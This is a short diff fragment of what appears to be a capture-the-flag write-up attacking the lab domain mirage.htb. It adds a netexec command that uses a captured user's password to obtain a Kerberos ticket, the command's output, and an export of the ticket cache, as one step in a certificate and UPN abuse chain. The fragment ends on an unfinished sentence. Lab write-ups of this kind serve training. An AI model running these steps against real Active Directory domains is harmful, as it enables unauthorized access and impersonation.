@@ -871,7 +871,17 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 Then ill modify the accounts UPN
 
+```python
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u 'mark.bbond' -p '1day@atime' -k --generate-tgt mark
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mark.bbond:1day@atime 
+SMB         dc01.mirage.htb 445    dc01             [+] TGT saved to: mark.ccache
+SMB         dc01.mirage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=mark.ccache
 
+❯❯❯ export KRB5CCNAME=mark.ccache
+```
+
+I then need to requesta TG
 
 
 
